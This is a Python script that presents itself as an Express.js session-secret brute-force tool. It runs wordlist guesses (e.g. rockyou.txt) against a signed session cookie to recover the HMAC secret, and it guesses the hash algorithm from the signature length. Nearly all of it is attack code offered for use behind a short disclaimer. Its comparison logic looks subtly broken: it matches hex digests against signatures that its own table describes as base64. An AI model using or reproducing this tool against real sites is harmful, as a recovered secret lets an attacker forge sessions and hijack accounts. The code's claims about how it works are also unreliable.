#!/usr/bin/env python3
import hmac
import hashlib
import argparse
import sys
import base64
from tabulate import tabulate

BANNER = """
🔐 Express.js HMAC Session Brute-Force Tool
Created by: The Nightmare Wolf 🐺

⚠️ DISCLAIMER: 
This tool is intended for **ethical security testing and bug bounty research ONLY**. 
It **must NOT** be used for unauthorized or illegal activities. The developer **assumes no responsibility** 
for any misuse or unlawful intent. Use at your **own risk** and ensure compliance with applicable laws.
"""

HASH_REFERENCE_TABLE = [
    ["MD5", "32", "22"],
    ["SHA1", "40", "27"],
    ["SHA256", "64", "43"],
    ["SHA512", "128", "86"]
]

HELP_TEXT = f"""
{BANNER}
🚀 Purpose:
This tool can:
1️⃣ **Brute-force** Express.js session HMAC secrets.
2️⃣ **Identify** the hashing algorithm used for a session signature.

📌 Usage Examples:

🔹 **Brute-Force a Session Secret (Default: sha256)**
    python3 brute_force_hmac.py -c "s:<SESSION_ID>.<SIGNATURE>" -w rockyou.txt

🔹 **Specify a Different Hashing Algorithm (e.g., sha1)**
    python3 brute_force_hmac.py -c "s:<SESSION_ID>.<SIGNATURE>" -w rockyou.txt -a sha1

🔹 **Identify the Hashing Algorithm of a Session Signature**
    python3 brute_force_hmac.py -s "<SIGNATURE>"

🔹 **Show Help Menu**
    python3 brute_force_hmac.py --help

🔎 **Hash Length Reference Table:**
{tabulate(HASH_REFERENCE_TABLE, headers=["Hash Algorithm", "Hex Digest Length", "Base64 Length"], tablefmt="grid")}

💡 Options:
  -c, --cookie      Express session cookie (format: 's:<SESSION_ID>.<SIGNATURE>')
  -w, --wordlist    Path to wordlist file
  -a, --algorithm   HMAC algorithm to use (default: sha256)
  -s, --signature   Analyze the hashing algorithm of a session signature
  --help            Show this help message and exit

🔧 Created by: The Nightmare Wolf 🐺
"""

def generate_hmac(secret, session_id, algo):
    """ Generate an HMAC signature using the specified hashing algorithm. """
    try:
        hash_function = getattr(hashlib, algo)  # Dynamically fetch hash function
    except AttributeError:
        print(f"❌ Error: Unsupported hashing algorithm '{algo}'")
        sys.exit(1)

    return hmac.new(secret.encode(), session_id.encode(), hash_function).hexdigest()

def brute_force_hmac(session_cookie, wordlist, algo):
    """ Attempt to brute-force the HMAC secret key. """
    try:
        session_id, signature = session_cookie.split(".")  # Extract session ID & signature
        session_id = session_id[2:]  # Remove the "s:" prefix
    except ValueError:
        print("❌ Error: Invalid cookie format. Ensure it's in 's:<SESSION_ID>.<SIGNATURE>' format.")
        sys.exit(1)

    print(f"🔍 Attempting to brute-force the HMAC secret using {algo}...")

    try:
        with open(wordlist, "r", encoding="latin-1") as file:
            for line in file:
                secret = line.strip()
                computed_sig = generate_hmac(secret, session_id, algo)

                if computed_sig == signature:
                    print(f"🔥 Secret Key Found: {secret}")
                    return secret  # Stop once a match is found
    except FileNotFoundError:
        print(f"❌ Error: Wordlist file '{wordlist}' not found.")
        sys.exit(1)

    print("❌ No matching secret key found.")
    return None

def analyze_signature(signature):
    """ Determine the hashing algorithm based on the signature length. """
    signature_length = len(signature)
    results = []

    # Possible hash matches based on known lengths
    if signature_length in [32, 22]:
        results.append(["MD5", "✅ Possible"])
    if signature_length in [40, 27]:
        results.append(["SHA1", "✅ Likely"])
    if signature_length in [64, 43]:
        results.append(["SHA256", "✅ Highly Likely"])
    if signature_length in [128, 86]:
        results.append(["SHA512", "✅ Strong Match"])

    # Try Base64 decoding - If it decodes successfully, it's likely Base64 encoded
    try:
        decoded = base64.b64decode(signature + "===", validate=True).hex()
        results.append(["Base64 Encoded?", f"✅ Yes, Decoded: {decoded[:10]}..."])
    except Exception:
        results.append(["Base64 Encoded?", "❌ No"])

    # If no hash match was found, mark it as unknown
    if not results:
        results.append(["Unknown", "❌ No match found"])

    # Display results in a table format
    print("\n🔎 **Hash Algorithm Identification:**\n")
    print(tabulate(results, headers=["Algorithm", "Confidence"], tablefmt="grid"))
    print()


def main():
    parser = argparse.ArgumentParser(
        description=BANNER,
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False  # Disable default argparse help to use custom
    )

    parser.add_argument("--help", action="store_true", help="Show this help message and exit")
    parser.add_argument("-s", "--signature", help="Analyze the hashing algorithm of a session signature")

    # First Parse to Check if Help or Signature Analysis is Requested
    args, unknown = parser.parse_known_args()

    if args.help:
        print(HELP_TEXT)
        sys.exit(0)

    if args.signature:
        analyze_signature(args.signature)
        sys.exit(0)

    # Re-parse with Required Arguments for Brute Force Mode
    parser = argparse.ArgumentParser(
        description=BANNER,
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument("-c", "--cookie", required=True, help="Express session cookie (format: 's:<SESSION_ID>.<SIGNATURE>')")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-a", "--algorithm", default="sha256", help="HMAC algorithm to use (default: sha256)")

    args = parser.parse_args()

    print(BANNER)
    print(f"🔑 Cookie: {args.cookie}")
    print(f"📂 Wordlist: {args.wordlist}")
    print(f"🔐 Hashing Algorithm: {args.algorithm}")

    brute_force_hmac(args.cookie, args.wordlist, args.algorithm)

if __name__ == "__main__":
    main()
